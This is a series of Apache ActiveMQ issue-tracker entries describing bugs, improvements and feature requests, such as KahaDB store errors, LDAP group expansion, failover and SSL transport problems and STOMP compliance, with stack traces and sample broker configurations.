When running the DurableSubProcessWithRestartTest for long intervals you can sometimes see.ERROR rableSubProcessWithRestartTest - Server.run failedjava.lang.RuntimeException: Server.run failed at org.apache.activemq.usecases.DurableSubProcessWithRestartTest.exit(DurableSubProcessWithRestartTest.java:738) at org.apache.activemq.usecases.DurableSubProcessWithRestartTest$Server.run(DurableSubProcessWithRestartTest.java:185)Caused by: javax.jms.JMSException: STORE COMMIT FAILED: Transaction rolled back. at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:49) at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1297) at org.apache.activemq.TransactionContext.syncSendPacketWithInterruptionHandling(TransactionContext.java:748) at org.apache.activemq.TransactionContext.commit(TransactionContext.java:322) at org.apache.activemq.ActiveMQSession.commit(ActiveMQSession.java:560) at org.apache.activemq.usecases.DurableSubProcessWithRestartTest$Server.send(DurableSubProcessWithRestartTest.java:232) at org.apache.activemq.usecases.DurableSubProcessWithRestartTest$Server.run(DurableSubProcessWithRestartTest.java:179)Caused by: javax.transaction.xa.XAException: STORE COMMIT FAILED: Transaction rolled back. at org.apache.activemq.transaction.LocalTransaction.commit(LocalTransaction.java:77) at org.apache.activemq.broker.TransactionBroker.commitTransaction(TransactionBroker.java:252) at org.apache.activemq.broker.MutableBrokerFilter.commitTransaction(MutableBrokerFilter.java:103) at org.apache.activemq.broker.TransportConnection.processCommitTransactionOnePhase(TransportConnection.java:414) at org.apache.activemq.command.TransactionInfo.visit(TransactionInfo.java:100) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:291) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:149) at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:116) at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50) at org.apache.activemq.transport.vm.VMTransport.iterate(VMTransport.java:218) at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122) at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43) at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908) at java.lang.Thread.run(Thread.java:680)Caused by: java.lang.ClassCastException: org.apache.kahadb.index.BTreeNode cannot be cast to org.apache.kahadb.index.ListNode at org.apache.kahadb.index.ListIndex.loadNode(ListIndex.java:289) at org.apache.kahadb.index.ListIndex.getHead(ListIndex.java:98) at org.apache.kahadb.index.ListIndex.iterator(ListIndex.java:266) at org.apache.kahadb.index.ListIndex.get(ListIndex.java:127) at org.apache.activemq.store.kahadb.MessageDatabase.addAckLocationForNewMessage(MessageDatabase.java:1826) at org.apache.activemq.store.kahadb.MessageDatabase.upadateIndex(MessageDatabase.java:1130) at org.apache.activemq.store.kahadb.MessageDatabase$AddOpperation.execute(MessageDatabase.java:2029) at org.apache.activemq.store.kahadb.MessageDatabase$18.execute(MessageDatabase.java:1055) at org.apache.kahadb.page.Transaction.execute(Transaction.java:765) at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:1052) at org.apache.activemq.store.kahadb.MessageDatabase$13.visit(MessageDatabase.java:921) at org.apache.activemq.store.kahadb.data.KahaCommitCommand.visit(KahaCommitCommand.java:130) at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:903) at org.apache.activemq.store.kahadb.MessageDatabase.store(MessageDatabase.java:815) at org.apache.activemq.store.kahadb.KahaDBTransactionStore.commit(KahaDBTransactionStore.java:267) at org.apache.activemq.transaction.LocalTransaction.commit(LocalTransaction.java:72) ... 14 more
issueID:AMQ-3769
type:New Feature
changed files:
texts:Support doing non-blocking sends that uses an async callback that gets notified when the send has been received by the broker
None
issueID:AMQ-3770
type:Improvement
changed files:
texts:Generalize LDAP group processing / LDAP group expansion
One of the issues with the way that LDAP integration is implemented in ActiveMQ is that it is making some serious assumptions based on how the examples are for Apache Directory. These assumptions prevent other LDAP implementations from functioning correctly (e.g., Active Directory). I"ve gone in and replaced all of the String.split stuff with LdapName. LdapName is Java"s implementation of RFC 2253 for names in LDAP. All current test cases still work, while allowing other LDAP implementations to work.I"ve also implemented group expansion for the LDAPLoginModule. For example, group A is a member of groups B and C. User X is a member of group A, which should mean user X is also a member of groups B and C by virtue of being in group A. This allows for a hierarchy of roles making role management much easier in my opinion.
issueID:AMQ-3772
type:Improvement
changed files:
texts:Add levelDB store support to ActiveMQ
None
issueID:AMQ-3774
type:Task
changed files:
texts:update jdom bundle version to match Camel and ServiceMix
See https://issues.apache.org/jira/browse/SMX4-1115I plan to update jdom to 1.1_4 to match ServiceMix and Camel.
issueID:AMQ-3775
type:Bug
changed files:MessageDatabase.java
texts:KahaDB journal files retained after delay in "unsubscribing" durable subscriber from topic.
KahaDB journal files retained after delay in "unsubscribing" durable subscriber from topic.This issue only appears to occur when Durable Subscriber is registered with a "selector" that does not match all messages on topic.Scenario:Msg Producer sending messages to topic.Durable subscriber registered with a selector on topicAfter 20 seconds; stop calling consumer.receive() .Another Durable subscriber registers on the topicAfter 20 seconds; stop calling consumer.receive() .Continue this pattern till 10 durable subscribers are registered with topicThen unsubscribe all 10 Durable subscribers.
issueID:AMQ-3776
type:Bug
changed files:MessageListenerServlet.java
texts:synchronization error in MessageListenerServlet.getAjaxWebClient
Note: I found this problem by reading code, not by an actual behavior problem!In the latest revision of MessageListenerServlet.getAjaxWebClient() you can see that the ajaxWebClients map is read outside of a synchronized block and then edited inside the block. This looks like a simple mistake, and the get() should be moved down one line.http://svn.apache.org/viewvc/activemq/trunk/activemq-web/src/main/java/org/apache/activemq/web/MessageListenerServlet.java?revision=1177026&view=markup#l438Theoretically, the downside of this bug will be that new clients will be unnecessarily created if a single web session connects to the servlet from two or more concurrent connections. In practice, this almost never happens because most ajax users of ActiveMQ should have only one connection in flight at a time.
issueID:AMQ-3777
type:Bug
changed files:
texts:Incorrect variable name in bin/activemq
The script bin/activemq uses the variable ACTIVEMQ_CONFIGS. However, on the following line, there is an extra C:echo "INFO: Using alternative activemq configuration files: $ACCTIVEMQ_CONFIGS"It does not affect functionality of the script, it just stops the value of ACTIVEMQ_CONFIGS being echoed to the terminal.
issueID:AMQ-3779
type:Improvement
changed files:
texts:Allow logging broker plugin to use a log per destination
Re:http://activemq.2283324.n4.nabble.com/How-to-log-all-incoming-msgs-of-Queue-quot-hello-quot-into-a-separate-logfile-td4487917.htmlWould be nice to configure the http://activemq.apache.org/logging-interceptor.html to use a send message log per destination so that destination messages can be easily partitioned.A logPerDestination boolean attribute, that would cause the plugin to use a logger of the form: org.apache.activemq.broker.util.LoggingBrokerPlugin.<destination name> for producer send events&#8211;Query on composites?For the simplest implementation, composites, they would have their unique log rather than parsing the composite and repeating the log message per destination.
issueID:AMQ-378
type:New Feature
changed files:
texts:add pluggable Policy which is fired in a background Timer to detect slow consumers for non-durable topics and kill them (maybe with a pre-warning of being slow a little before being killed)
None
issueID:AMQ-3780
type:Bug
changed files:
texts:Non-persistent messages in the tmp-storage directory are not cleaned up when destination is deleted
Non-persistent messages stored in the tmp-storage directory are not cleaned up when the destination is deleted.  The StoreQueueCursor doesn"t clear out its FilePendingMessageCursor on stop so the non-persistent messages are left on disk when the Queue is deleted.
issueID:AMQ-3782
type:Bug
changed files:FailoverTransport.java
texts:FailoverTransport throws NPE
Failover transport occasionally throws NullPointerExceptionINFO   | jvm 1    | 2012/03/19 09:25:05 | Exception in thread "ActiveMQ Failover Worker: 2009192672" java.lang.NullPointerExceptionINFO   | jvm 1    | 2012/03/19 09:25:05 |       at org.apache.activemq.transport.failover.FailoverTransport$2.iterate(FailoverTransport.java:125)INFO   | jvm 1    | 2012/03/19 09:25:05 |       at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:98)INFO   | jvm 1    | 2012/03/19 09:25:05 |       at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)It seems like DedicatedTaskRunner starts Thread before FailoverTransport finish initializing   reconnectTask field. Same code is present in 5.5.1 so it"s possible that same bug is out there
issueID:AMQ-3785
type:Bug
changed files:
texts:ActiveMQSslConnectionFactory does not detect ssl request in failover URIs when creating transports
The createTransport method in ActiveMQSslConnectionFactory delegates to the super class if the URI scheme is not ssl. Failover URIs have "failover" as the URI scheme and so always delegate to the superclass. This causesssl connections that need key or trust stores manipulated by code to hang or fail  as the credentials are not available. Code from  SVN trunk for ActiveMQSslConnectionFactory shows why protected Transport createTransport() throws JMSException {        // If the given URI is non-ssl, let superclass handle it.        if (!brokerURL.getScheme().equals("ssl")) {            return super.createTransport();        }// !! jackf comment Code below never reached for failover URIs like failover:ssl:... or failover:(tcp:..., ssl...)// because the URI Scheme is failover, not ssl.// Therefore connections that need a keyManager or trustManager fail        try {            if (keyManager == null || trustManager == null) {                trustManager = createTrustManager();                keyManager = createKeyManager();                // secureRandom can be left as null            }            SslTransportFactory sslFactory = new SslTransportFactory();            SslContext ctx = new SslContext(keyManager, trustManager, secureRandom);            SslContext.setCurrentSslContext(ctx);            return sslFactory.doConnect(brokerURL);        } catch (Exception e) {            throw JMSExceptionSupport.create("Could not create Transport. Reason: " + e, e);        }    }(Vague) Solution: 1) need better pattern match than URI scheme to detect requests for ssl connections. 2) A failover URI is  essentially a list of URIs so multiple ssl transport requests may be in the failover list. A first start is to require that the same key and trust stores are used for all failover connections but you may want to consider allowing customized stores for each of the ssl connections.
issueID:AMQ-3786
type:Improvement
changed files:
texts:Add support for MQTT
Support MQTT v3.1 protocol - see http://mqtt.org/
issueID:AMQ-3787
type:New Feature
changed files:
texts:useCompression on server side specially on network of brokers
For WAN connections network of brokers needs to utilize bandwidth, that"s why if compression can be entered on server side this can be very usefull option.
issueID:AMQ-3788
type:Improvement
changed files:ActiveMQConnectionFactory.java
texts:getStatus on ActiveMQConnectionFactory is not implemented
See this bloghttp://rterp.wordpress.com/2012/03/27/hacking-activemq-to-retrieve-connection-statistics/The source code in ActiveMQConnectionFactory is on trunk as follows   public StatsImpl getStats() {        // TODO        return null;    }Maybe at least for now, add javadoc to indicate the method is not implemented etc. Or better yet, implement the method
issueID:AMQ-3789
type:Bug
changed files:
texts:Setting java.io.tmp makes problems with some shell commands
The problem is that with setting java.io.tmp we hit JDK bug and are not able to get list of active VMs, which are used in various shell commands (like stop, list, etc.). The easy solution is to set this property only when we start a broker (as we really don"t use it in other scenarios).
issueID:AMQ-3790
type:Improvement
changed files:MBeansAttributeQueryFilter.java
texts:Improve bstat command not to fail if MBean is deleted during processing
BStat gets data in two steps, first it query all mbeans to display and then fetches their attributes. It can happen that for example the queue is deleted in the process so fetching properties for that queue fails. We should ignore this and return regular result result for the rest of the mbeans.
issueID:AMQ-3791
type:Bug
changed files:
texts:Flexibility, concurrency, security, and compatibility issues in CachedLDAPAuthorizationMap
CachedLDAPAuthorizationMap provides support for dynamic AuthZ policy updates without restarting the broker; however, I think there are several issues with the implementation.1) The underlying structures for storing and managing AuthZ policy are not concurrent or synchronized.2) DN manipulation using Strings is error prone and the current implementation is case sensitive.  This case sensitivity leads to issues with AD.3) For synchronous updates to the AuthZ policy, the temp destination policy is not reset and may retain out-of-date policy entries.1) Requires examining the usage of these structures and applying the necessary protections.2) Can be resolved with better String parsing or through applying the changes in AMQ-3770 to CachedLDAPAuthorizationMap as well.3) Can be resolved by clearing the policy entry before repopulating the policy from LDAP.There are also several enhancements to the configurability of the implementation that I see:1) Support user or group membership in the LDAP entry representing a permission on a destination.  Allowing user DNs or group DNs here makes it easier to deal with one-off policies for individual users.2) Group membership in the LDAP entry representing a permission on a destination should support use of the full DN, not just the value of the member CN.3) The based DN should be fully customizable and the LDAP entry representing a permission on a destination should support use of an optional prefix for uniqueness.  "cn=<PREFIX>read,ou=$,..."4) The name of the GroupPrincipal or UserPrincipal that is created from the policy in LDAP should be flexible.  For instance, allow the group name or user name attribute to be configured.
issueID:AMQ-3792
type:Bug
changed files:
texts:use of the failover transport incorrectly suppresses javax.jms.InvalidClientIDException when clientId is already in use
Chucking an javax.jms.InvalidClientIDException is currently conditional on the connection not being fault tolerant and not being a network connector which seems incorrect.In both cases, a duplicate connection is still a duplicate and we should wait till it is cleaned up/disposed.A failover variant of the test from https://issues.apache.org/jira/browse/AMQ-463 demonstrates.This change was introduced in http://svn.apache.org/viewvc/activemq/trunk/activemq-core/src/main/java/org/apache/activemq/broker/region/RegionBroker.java?annotate=633800 but it looks like suppression of a duplicate connectionId in TransportConnector is sufficient for the reconnect case.
issueID:AMQ-3797
type:Bug
changed files:
texts:org.apache.activemq.util.StringArrayEditor causes classloader leaks
A static block in org.apache.activemq.util.IntrospectionSupport registers org.apache.activemq.util.StringArrayEditor with java.beans.PropertyEditorManager. In a web application environment, this will cause classloader leaks, since java.beans.PropertyEditorManager keeps a strong reference to the editor class.ActiveMQ should at least provide a graceful means of deregistering org.apache.activemq.util.StringArrayEditor (by calling java.beans.PropertyEditorManager.registerEditor() again with editor class null).
issueID:AMQ-3799
type:Improvement
changed files:
texts:activemq-karaf features.xml should use joda-time 1.6.2 which is already a bundle
None
issueID:AMQ-3801
type:Bug
changed files:JobSchedulerStore.java
texts:Job scheduler can lose data on forced kill
The page file that keeps the index of jobs to be scheduled is using default write batch size of 1000. That means that index could get into incorrect state when broker is killed (and there"s no recovery for this index). Turning off batching (as it"s not needed for this low-volume index) will ensure that changes are always persisted immediately.
issueID:AMQ-3802
type:Bug
changed files:
texts:Successful unsubscribing should not report inactive durable topic subscribers
An unsubscribe call should remove the client from inactive durable topic subscribers list. In the current broker behavior, even if a durable consumer unsubscribes & shuts down gracefully, the broker marks the durable subscriber as inactive. If this durable subscriber was never meant to come up again(as in my case where i am testing rigorously using unique client-ids each time based on pid) then broker will unnecessarily mark a lot of consumers as inactive durable.For inactive durable subscribers, there is no distinction between a subscriber going down abruptly or unsubscribing & going down gracefully.This should be improved I think. Moreover, any tips on how to remove those 1000s of inactive subscriptions dangling in my Jconsole ?? Destroying each manually isn"t an option !
issueID:AMQ-3803
type:Bug
changed files:
texts:ActiveMQWASInitialContextFactory throws ClassCastException in WebSphere 8
WebSphere 8 includes values other than Strings in the Hashtable provided to configure the external initial context factory when setting up a Generic JMS Provider.The org.apache.activemq.jndi.AcuityActiveMQWASInitialContextFactory class does not anticipate non-string values in the Hashtable and throws a ClassCastException.Key: osgi.service.jndi.bundleContext (String)Value: com.ibm.osgi.jndi.fep.GatewayBundleContextProxy
issueID:AMQ-3804
type:Bug
changed files:MessageDatabase.java
texts:NullPointerException logged every 30 seconds while attempting to clear expired messages
this is a duplicate of AMQ-3677 which was marked resolved. however i am still noticing this issue using the 5.6 snapshot release from apr 11, 2012. in this case activemq server was shutdown by terminating the java process. when the server is started again, following exception is logged every 30 seconds:2012-04-11 14:06:53,786 org.apache.activemq.broker.region.Topic[ActiveMQ Broker[ZyrionMessageBus] Scheduler]: (ERROR) (   Topic.java:683) Failed to remove expired Message from the store java.lang.NullPointerException at org.apache.activemq.store.kahadb.MessageDatabase.removeAckLocation(MessageDatabase.java:2005) at org.apache.activemq.store.kahadb.MessageDatabase.updateIndex(MessageDatabase.java:1259) at org.apache.activemq.store.kahadb.MessageDatabase$15.execute(MessageDatabase.java:1046) at org.apache.kahadb.page.Transaction.execute(Transaction.java:769) at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:1044) at org.apache.activemq.store.kahadb.MessageDatabase$13.visit(MessageDatabase.java:977) at org.apache.activemq.store.kahadb.data.KahaRemoveMessageCommand.visit(KahaRemoveMessageCommand.java:220) at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:969) at org.apache.activemq.store.kahadb.MessageDatabase.store(MessageDatabase.java:881) at org.apache.activemq.store.kahadb.MessageDatabase.store(MessageDatabase.java:863) at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBTopicMessageStore.doAcknowledge(KahaDBStore.java:715) at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBTopicMessageStore.acknowledge(KahaDBStore.java:701) at org.apache.activemq.store.kahadb.KahaDBTransactionStore.acknowledge(KahaDBTransactionStore.java:519) at org.apache.activemq.store.kahadb.KahaDBTransactionStore$2.acknowledge(KahaDBTransactionStore.java:222) at org.apache.activemq.broker.region.Topic.acknowledge(Topic.java:489) at org.apache.activemq.broker.region.Topic.messageExpired(Topic.java:681) at org.apache.activemq.broker.region.Topic.doBrowse(Topic.java:562) at org.apache.activemq.broker.region.Topic.access$100(Topic.java:62) at org.apache.activemq.broker.region.Topic$6.run(Topic.java:662) at org.apache.activemq.thread.SchedulerTimerTask.run(SchedulerTimerTask.java:33) at java.util.TimerThread.mainLoop(Unknown Source) at java.util.TimerThread.run(Unknown Source)here is the server configuration:<beans    xmlns="http://www.springframework.org/schema/beans"    xmlns:amq="http://activemq.apache.org/schema/core"    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"    xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-2.0.xsd    http://activemq.apache.org/schema/core http://activemq.apache.org/schema/core/activemq-core.xsd">  <!-- Allows us to use system properties as variables in this configuration file -->  <bean class="org.springframework.beans.factory.config.PropertyPlaceholderConfigurer"/>    <!-- Configure the ActiveMQ broker -->  <broker      xmlns="http://activemq.apache.org/schema/core"      brokerName="ZyrionMessageBus"       useJmx="false"      dataDirectory="${activemq.base}/../../utils/spool/jms"      deleteAllMessagesOnStartup="false"      advisorySupport="false"      offlineDurableSubscriberTimeout="7200000"      offlineDurableSubscriberTaskSchedule="1800000">    [...]    <!-- Configure message persistence for the broker -->    <persistenceAdapter>      <kahaDB directory="${activemq.base}/../../utils/spool/jms/kahadb" ignoreMissingJournalfiles="true" checkForCorruptJournalFiles="true" checksumJournalFiles="true"/>    </persistenceAdapter>i can provide a copy of the kahadb directory if necessary to duplicate the issue. let me know if you require any additional information. thanks
issueID:AMQ-3805
type:Bug
changed files:
texts:duplicate dispatch to durable sub with concurrent send transaction commit and activate
A durable sub can get duplicate message dispatches when a large send transaction is committing and the subscription is activated.The completion of the send transaction does a dispatch with the new messages already in the store. An activate does a dispatch from the store. The result can be duplicate dispatches to the subs pending list. The problem is the reset of the audit during activation. The audit should suppress the duplicate dispatch.
issueID:AMQ-3806
type:Bug
changed files:Queue.java
texts:Partial index updates can lead to bogus recovery for the vmcursor of a Q on startup
seeing INFO | Using Persistence Adapter: org.apache.activemq.store.kahadb.KahaDBStore@49f10a67INFO | KahaDB is version 4INFO | Recovering from the journal ...INFO | Recovery replayed 1 operations from the journal in 0.063 seconds.INFO | ActiveMQ 5.5.1 JMS Message Broker (..) is startingINFO | For help or more information please see: http://activemq.apache.org/INFO | cursor for queue://JMS/XXXXX has recovered 10000 messages. 2147483647% completeINFO | cursor for queue://JMS/XXXXX has recovered 20000 messages. 2147483647% completeThe crazy % is the result of recovering on a store that has 0 messages. The orderIndex seems to still allow iteration (possibly part of a partial index update) and can result in recovering for ever.
issueID:AMQ-3807
type:Bug
changed files:ManagementContext.java
texts:MBeans are not unregistered under WebSphere
When running ActiveMQ in embedded mode under WebSphere (I know that this is not a typical JEE-compliant deployment)  the ObjectNames of the registered MBeans are modified by the container. Unfortunately, ActiveMQ fails to keep these names. As a result, ActiveMQ does not unregister its beans when an application is stopped, and a restart causes InstanceAlreadyExistExceptions.The following change to ManagementContext.java may help:Currently:public ObjectInstance registerMBean(Object bean, ObjectName name) throws Exception {        ObjectInstance result = getMBeanServer().registerMBean(bean, name);        this.registeredMBeanNames.add(name);        return result;    }but it should be something like:public ObjectInstance registerMBean(Object bean, ObjectName name) throws Exception {        ObjectInstance result = getMBeanServer().registerMBean(bean, name);        if (result != null) this.registeredMBeanNames.add(result.getObjectName);        return result;    }
issueID:AMQ-3812
type:Bug
changed files:
texts:activemq-core won&#39;t deploy in Karaf, missing fusesource imports
When trying to deploy 5.6-SNAPSHOT into Karaf/SMX activemq-core won"t resolve due to missing imports. org.fusesource.hawtbuf;version="[1.9,2)",org.fusesource.mq.leveldb,org.fusesource.mqtt.client,org.fusesource.mqtt.codecjava.lang.Exception: Could not start bundle mvn:org.apache.activemq/activemq-core/5.6-SNAPSHOT in feature(s) activemq-5.6-SNAPSHOT, activemq-1.0-SNAPSHOT: Unresolved constraint in bundle org.apache.activemq.activemq-core &#91;71&#93;: Unable to resolve 71.0: missing requirement &#91;71.0&#93; package; (&(package=org.fusesource.hawtbuf)(version>=1.9.0)(!(version>=2.0.0))) at org.apache.karaf.features.internal.FeaturesServiceImpl.installFeatures(FeaturesServiceImpl.java:353)&#91;27:org.apache.karaf.features.core:2.2.4&#93; at org.apache.karaf.features.internal.FeaturesServiceImpl$1.run(FeaturesServiceImpl.java:975)&#91;27:org.apache.karaf.features.core:2.2.4&#93;Caused by: org.osgi.framework.BundleException: Unresolved constraint in bundle org.apache.activemq.activemq-core &#91;71&#93;: Unable to resolve 71.0: missing requirement &#91;71.0&#93; package; (&(package=org.fusesource.hawtbuf)(version>=1.9.0)(!(version>=2.0.0))) at org.apache.felix.framework.Felix.resolveBundle(Felix.java:3446)&#91;org.apache.felix.framework-3.0.9.jar:&#93; at org.apache.felix.framework.Felix.startBundle(Felix.java:1734)&#91;org.apache.felix.framework-3.0.9.jar:&#93; at org.apache.felix.framework.BundleImpl.start(BundleImpl.java:918)&#91;org.apache.felix.framework-3.0.9.jar:&#93; at org.apache.felix.framework.BundleImpl.start(BundleImpl.java:905)&#91;org.apache.felix.framework-3.0.9.jar:&#93; at org.apache.karaf.features.internal.FeaturesServiceImpl.installFeatures(FeaturesServiceImpl.java:350)&#91;27:org.apache.karaf.features.core:2.2.4&#93; ... 1 more
issueID:AMQ-3813
type:Improvement
changed files:
texts:limit the number of producers and consumers created by a Connection
Sometimes a rogue client can create an unlimited number of producers or consumers if not developed correctly. The client is in effect launching a denial of service attack on the broker - as it will eventually run out of memory, storing ProducerInfos and ConsumerInfos. This enhancement enables the number of consumers and producers to be limited per connection - by adding maximumProducersAllowedPerConnection and maximumConsumersAllowedPerConnection properties to the transport connector - e.g.<amq:transportConnectors>   <amq:transportConnector uri="tcp://localhost:61631" maximumProducersAllowedPerConnection="5"  maximumConsumersAllowedPerConnection="10"/></amq:transportConnectors>
issueID:AMQ-3817
type:Bug
changed files:
texts:Marshalled properties don&#39;t get updated if modified during preProcessDispatch (TraceBrokerPathPlugin looks broken)
Enabling the TraceBrokerPathPlugin with a custom property name = "JMSXTrace" sends outdated information to the consumer. When inspecting the property at the consumer code, it has not been updated with the complete broker path. Only the first broker, where the message was produced into, appears. No matter how many brokers are in the route (tested with 4).Having dug into the code, it looks like marshalledProperties in Message were already set but not dirtied when setProperty was called again from the TraceBrokerPathPlugin. Also, Message.beforeMarshall() assumes that since marshalledProperties is already set, it doesn"t need updating. Therefore, the message is dispatched to the consumer with an old version of the properties.I think Message.setProperty() should check whether marshalledProperties already has a value. If it does, it should re-marshall (i.e. dirty the cache).
issueID:AMQ-3819
type:Bug
changed files:NIOSSLTransport.java
texts:high cpu with stomp+nio+ssl and many subscriptions
Switching an existing workload from a transport:<transportConnector name="verified_stompssl"  uri="stomp+ssl://0.0.0.0:6165?needClientAuth=true"/>to<transportConnector name="verified_stompssl"  uri="stomp+nio+ssl://0.0.0.0:6165?needClientAuth=true"/>showed the CPU profile to go from 1-5% to 300% constantly on a 8 core serverI was able to recreate this using a ruby client @ http://devco.net/rip/amq_560_stomp_nio_ssl_tester.rbThe important combinations are: I am connecting to a stomp+nio+ssl port I am creating the subscriptions to the 10 queus and topicsIf I change either of these variables - like just commenting out the loop that does those subscriptions - then the CPU load is acceptable.I analysed the running VM with VisualVM and found that transport.nio.NIOSSLTransport.serviceRead() is the busy thread.  My activemq.xml is:<beans  xmlns="http://www.springframework.org/schema/beans"  xmlns:amq="http://activemq.apache.org/schema/core"  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-2.0.xsd  http://activemq.apache.org/schema/core http://activemq.apache.org/schema/core/activemq-core.xsd  http://activemq.apache.org/camel/schema/spring http://activemq.apache.org/camel/schema/spring/camel-spring.xsd">    <broker xmlns="http://activemq.apache.org/schema/core" brokerName="amq1" useJmx="true" persistent="true" schedulePeriodForDestinationPurge="60000">        <destinationPolicy>          <policyMap>            <policyEntries>              <policyEntry topic=">" producerFlowControl="false"/>              <policyEntry queue="*.reply.>" gcInactiveDestinations="true" inactiveTimoutBeforeGC="120000" />            </policyEntries>          </policyMap>        </destinationPolicy>        <managementContext>          <managementContext connectorPort="1099" jmxDomainName="org.apache.activemq"/>        </managementContext>        <plugins>          <statisticsBrokerPlugin/>          <simpleAuthenticationPlugin>            <users>              <authenticationUser username="test" password="test" groups="admins,everyone"/>            </users>          </simpleAuthenticationPlugin>          <authorizationPlugin>            <map>              <authorizationMap>                <authorizationEntries>                  <authorizationEntry queue=">" write="admins" read="admins" admin="admins" />                  <authorizationEntry topic=">" write="admins" read="admins" admin="admins" />                </authorizationEntries>              </authorizationMap>            </map>          </authorizationPlugin>        </plugins>        <sslContext>           <sslContext                keyStore="keystore.jks" keyStorePassword="ohshahCu"                trustStore="truststore.jks" trustStorePassword="ohshahCu"           />        </sslContext>        <systemUsage>          <systemUsage>            <memoryUsage>              <memoryUsage limit="200 mb" />            </memoryUsage>            <storeUsage>              <storeUsage limit="1 gb" />            </storeUsage>            <tempUsage>              <tempUsage limit="1 gb" />            </tempUsage>          </systemUsage>        </systemUsage>        <transportConnectors>          <transportConnector name="openwire"  uri="tcp://0.0.0.0:6166"/>          <transportConnector name="stomp+nio" uri="stomp+nio://0.0.0.0:6163"/>          <transportConnector name="stompssl"  uri="stomp+ssl://0.0.0.0:6164"/>          <transportConnector name="verified_stompssl"  uri="stomp+nio+ssl://0.0.0.0:6165?needClientAuth=true"/>        </transportConnectors>    </broker>    <import resource="jetty.xml"/></beans>
issueID:AMQ-3820
type:New Feature
changed files:
texts:Exposing subscription statistics through Statistics plug-in
Retrieve subscription statistics from the statistics plugin. Ideally all of the attributes exposed on the subscription MBeans would be returned.
issueID:AMQ-3822
type:Improvement
changed files:
texts:The current sslContext element does not provide the ability to define the keystore key password key.
The current use of the sslContext element does not provide the ability to use a keystore that requires two separate passwords, one for the store password and another for the key password.This ticket is being created to include another attribute of the sslContext element that you can use to define the keystore key password.
issueID:AMQ-3823
type:Bug
changed files:
texts:AMQ 5.6 Stomp v1.1 support fail to respect the spec and trims all ws from message headers
The Stomp v1.1 spec defines that STOMP severs should no trim ws from message headers:The STOMP 1.0 specification included many example frames with padding in the headers and many servers and clients were implemented to trim or pad header values. This causes problems if applications want to send headers that SHOULD not get trimmed. In STOMP 1.1, clients and servers MUST never trim or pad headers with spaces.
issueID:AMQ-3824
type:Improvement
changed files:
texts:Add ability to run ActiveMQ as a service on x64 windows in 64bit JVM
We currently on provide a 32bit service wrapper for ActiveMQ on windows.  Using the build of the wrapper.dll that"s been added to Karaf (https://issues.apache.org/jira/browse/KARAF-1010) we can now supply a 64bit version as well as its built from the JSW 3.2.3 source.  See also:http://maven.40175.n5.nabble.com/Looking-for-free-wrapper-windows-x86-64-exe-version-3-2-3-td4851520.htmlSonatype has published binaries on github: https://github.com/sonatype/jsw-binaries
issueID:AMQ-3827
type:Bug
changed files:
texts:The SslContext definition is not used by the https transport protocol.
The current https transport protocol does not allow the ability to use the SslContext instance to setup the secure communication for the broker.  The current implementation requires that you define the standard security properties.
issueID:AMQ-3828
type:Bug
changed files:
texts:URISupport incorrectly handles parenthesis
URISupport.parseComposite(URI) incorrectly parses an URI with a closing parenthesis ")" in the query part.// The URI is parsed incorrectly when there is an unescaped ")"URI uri = new URI("failover://()?updateURIsURL=file:/C:/Dir(1)/a.csv");CompositeData data = URISupport.parseComposite(uri);// Parsed Composite Data:// - Components: [)?updateURIsURL=file:/C:/Dir(1]// -   Fragment: null// -       Host: // - Parameters: {}// -       Path: a.csv// -     Scheme: failover// The URI is parsed correctly when it is an escapedURI uri = new URI("failover://()?updateURIsURL=file:/C:/Dir%281%29/a.csv");CompositeData data = URISupport.parseComposite(uri); // Parsed Composite Data: // - Components: []// -   Fragment: null// -       Host: // - Parameters: {updateURIsURL=file:/C:/Dir(1)/a.csv}// -       Path: null// -     Scheme: failoverI think URISupport should either throw an URISyntaxException or parse it correctly.See RFC2396:Unreserved characters can be escaped without changing the semanticsof the URI, but this should not be done unless the URI is being usedin a context that does not allow the unescaped character to appear.By the way, the problem occurs in the method parseComposite(URI uri, CompositeData rc, String ssp), at:...p = ssp.lastIndexOf(")");...
issueID:AMQ-3831
type:Bug
changed files:
texts:Exit code is not properly returned when using RUN_AS_USER
There was an issue in the init.d scripts generated by the maven appassembler plugin that is in ActiveMQ toohttp://jira.codehaus.org/browse/MAPPASM-113When using RUN_AS_USER (set to a different user than the current one) su is called to call the script again. The return code of the called script is later ignored and 0 is always returned.For example, status should return non zero when service is not running, but it returns zero anyway.
issueID:AMQ-3832
type:Bug
changed files:
texts:Upgrade maven-bundle-plugin
We have been hit by https://issues.apache.org/jira/browse/FELIX-3058 during 5.6.0 release, so some of the modules don"t have source jars in it. We should upgrade to 2.3.6 bundle plugin and see how to provide those source jars (if possible) for 5.6.0 release.
issueID:AMQ-3833
type:Improvement
changed files:
texts:Only checkpoint data on modification (producerAudit should not be written if unmodified)
The journal is written and reclaimed on an inactive broker. Checkpoint repeatedly writes a produce audit command. This should be conditional on modification of the audit.
issueID:AMQ-3835
type:Bug
changed files:
texts:STOMP 1.0 protocol (read ACK) broken on ActiveMQ 5.6.0
